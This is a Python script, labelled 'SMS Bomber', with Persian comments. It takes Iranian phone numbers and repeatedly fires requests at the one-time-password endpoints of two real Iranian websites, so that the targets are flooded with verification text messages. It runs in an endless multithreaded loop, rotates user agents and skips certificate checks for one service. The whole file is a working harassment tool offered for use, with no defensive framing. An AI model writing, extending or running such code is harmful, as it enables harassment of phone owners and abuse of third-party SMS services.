import requests
import re
import uuid
import time
from threading import Thread
from time import sleep
import socket
import urllib3
import random

# غیرفعال کردن هشدارهای urllib3
urllib3.disable_warnings()

# تعریف user_agents
user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0", 
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
]

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# ==========================
# بررسی اتصال اینترنت
# ==========================
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ==========================
# اعتبارسنجی شماره‌ها
# ==========================
def is_phone(phone_input: str):
    phones = phone_input.split('-')
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# ==========================
# تابع ارسال ایمن
# ==========================
def send_service_safe(service, phone):
    try:
        result = service(phone)
        if result:
            print(f"{g}[+] {service.__name__}: Code Sent!{a}")
        else:
            print(f"{y}[-] {service.__name__}: Failed or No Response{a}")
    except Exception as e:
        print(f"{r}[!] Error in {service.__name__}: {e}{a}")

# ==========================
# توابع سرویس‌ها
# ==========================



def mek(phone):
    formatted_phone = "+98" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))[1:]
    try:
        url = 'https://www.hamrah-mechanic.com/api/v1/membership/otp'
        data = {
            "PhoneNumber": formatted_phone,
            "prevDomainUrl": None,
            "landingPageUrl": "https://www.hamrah-mechanic.com/carprice/saipa/zamyadpickup/type-2543/",
            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
            "prevUrl": "https://www.hamrah-mechanic.com/profile/",
            "referrer": None
        }
        headers = {"Accept": "application/json", "Content-Type": "application/json"}
        r = requests.post(url, json=data, headers=headers, timeout=10, verify=False)
        if r.status_code == 200:
            print(f"{g}[+] mek: Code Sent!{a}")
            return True
        else:
            print(f"{r}[-] mek Error: {r.status_code}{a}")
            return False
    except Exception as e:
        print(f"{r}[!] mek Exception: {e}{a}")
        return False


def format_phone(phone: str):
    """تبدیل شماره به فرمت بدون صفر اول برای Alibaba"""
    digits = re.sub(r'[^0-9]', '', phone)
    return digits[1:] if digits.startswith("0") else digits

def alibaba(phone):
    phone_number = format_phone(phone)
    payload = {"phoneNumber": phone_number}
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "ab-channel": "WEB-NEW",
        "tracing-sessionid": "ab-alohomora",
        "tracing-device": "mobile, Mobile Safari, 18.6, iPhone, Apple, iOS, 18.6",
        "User-Agent": random.choice(user_agents)
    }
    try:
        print(f"[Alibaba] Payload: {payload}")
        print(f"[Alibaba] Headers: {headers}")
        r = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json=payload, headers=headers, timeout=10)
        if r.status_code == 200:
            print(f"{g}[Alibaba] Code Sent Successfully!{a}")
            return True
        else:
            print(f"{r}[-] Alibaba HTTP Error: {r.status_code}{a}")
            return False
    except Exception as e:
        print(f"{r}[!] Alibaba Exception: {e}{a}")

      

# ==========================
# لیست سرویس‌ها
# ==========================
services = [alibaba, mek]

# ==========================
# تابع VIP مولتی‌تردینگ
# ==========================
def vip(phones, delay=0.1):
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services Loaded: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    print(f"{y}══════════════════════════════════════════════{a}")
    
    try:
        while True:
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# ==========================
# منوی اصلی
# ==========================
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║                SMS Bomber                 ║
{y}╚════════════════════════════════════════════╝
{g} Services Loaded: {y}{len(services)}{a}
{y}══════════════════════════════════════════════
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# ==========================
# نقطه ورود
# ==========================
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        try:
            delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        except ValueError:
            delay = 0.1
        vip(phones, delay)
